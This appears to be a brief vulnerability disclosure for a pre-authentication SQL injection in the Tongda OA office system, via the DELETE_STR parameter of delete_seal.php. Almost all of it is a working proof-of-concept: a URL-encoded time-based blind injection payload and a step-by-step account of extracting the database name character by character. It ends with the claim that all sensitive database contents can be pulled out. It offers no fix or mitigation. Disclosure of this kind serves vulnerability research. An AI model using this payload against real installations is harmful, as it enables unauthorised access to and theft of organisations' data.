tongda oa foreground SQL injection vulnerability

official website:https://www.tongda2000.com/

version:Less than v11.10, v2017

route：general/system/seal_manage/iweboffice/delete_seal.php

injection parameter:$DELETE_STR


![WPS图片(1)](https://github.com/nagenanhai/cve/assets/42707759/5a855137-1829-41f2-8ff5-4ca530d76f83)

POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
We can use Cartesian product blind injection, the following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. ascii 116 also corresponds to the lowercase letter t. In this way, the database name and any database information can be obtained through blind injection.
![WPS图片(2)](https://github.com/nagenanhai/cve/assets/42707759/8b83d9b0-75e3-44f6-a589-d8026a1f9c42)

And if we change 116 to 115 there's no delay, there's no delay, there's SQL injection

![WPS图片(3)](https://github.com/nagenanhai/cve/assets/42707759/d483722b-22ad-4d88-a7b6-af4321adbd52)

The second part of the database is intercepted by blind injection, and the second part is identified as the letter d by the delay time

![WPS图片(4)](https://github.com/nagenanhai/cve/assets/42707759/c8f3a9d6-6624-4b5c-acf0-05ab8842580e)


In this way, we can inject all the sensitive information of the database through delayed injection.
